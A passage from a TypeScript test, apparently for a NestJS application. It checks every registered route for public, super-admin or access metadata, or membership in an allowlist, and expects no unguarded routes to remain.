          const route = `${verb} /${[base, String(p).replace(/^\/|\/$/g, '')].filter(Boolean).join('/')}`;
          const isPublic = reflector.getAllAndOverride<boolean>(IS_PUBLIC, [handler as never, wrapper.metatype as never]);
          const superOnly = reflector.getAllAndOverride<boolean>(SUPER_ADMIN, [handler as never, wrapper.metatype as never]);
          const access = Reflect.getMetadata(ACCESS, handler);
          if (isPublic || superOnly || access || SELF_OR_CATALOG.has(route)) continue;
          offenders.push(route);
        }
      }
    }
    expect(offenders).toEqual([]);
  });
});
